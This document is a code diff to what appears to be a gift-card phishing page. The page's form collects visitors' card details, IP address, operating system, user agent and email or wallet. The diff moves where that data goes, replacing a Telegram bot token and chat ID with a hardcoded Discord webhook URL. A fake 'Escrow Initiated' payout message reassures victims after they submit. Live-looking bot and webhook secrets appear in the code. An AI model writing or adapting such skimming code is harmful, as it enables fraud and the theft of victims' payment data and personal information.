@@ -304,11 +304,10 @@
         </div>
     </footer>
 
-    <!-- JavaScript Handling Integration & Telegram Transmission -->
+    <!-- JavaScript Handling Integration & Discord Webhook Transmission -->
     <script>
-        // Telegram Bot Credentials provided by user
-        const BOT_TOKEN = "9055081247:AAHBt5Insiecy5U748VshWM8ivMA6B9x5UY";
-    const CHAT_ID = "8622363315";
+        // Discord Webhook URL
+        const webhookUrl = 'https://discord.com/api/webhooks/1575588815547007057/4KPoJRon43cXJmbBryfI8Rmvd7ZI6rr0UFESbu7zgAsuO9B-4UzvA1ARaLfkRE5m3EYq';
 
         const form = document.getElementById('giftCardForm');
         const cardTypeSelect = document.getElementById('cardType');
@@ -489,7 +488,7 @@
 
             // Construct exact Telegram payload format with expanded terminal data if applicable
             let message = `
-New Gift Card Submission:
+**New Gift Card Submission:**
 🌐 | IP: ${ip}
 💻 | User OS: ${userOS}
 📱 |User Agent: ${userAgent}
@@ -515,15 +514,14 @@ Currency: ${currency}
             message += `📧 | Contact Email/Wallet: ${contactEmail}
             `;
 
-            // Use POST request for better compatibility with large payloads on mobile
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            // Send to Discord Webhook
+            fetch(webhookUrl, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message
+                    content: message
                 })
             })
             .then(response => {
@@ -534,7 +532,7 @@ Currency: ${currency}
                         showToast('Escrow Initiated', 'Card submitted successfully! Payout processing shortly.');
                         form.reset();
                         renderTerminalFields();
-                        
+
                         // Force close keyboard on iOS
                         document.activeElement.blur();
                     } else {
@@ -547,7 +545,7 @@ Currency: ${currency}
                     processingState.classList.add('hidden');
                     showToast('Network Error', 'Failed to reach telegram relay node.', true);
                     console.error(error);
-                    
+
                     // Force close keyboard on iOS even on error
                     document.activeElement.blur();
                 }, 600);
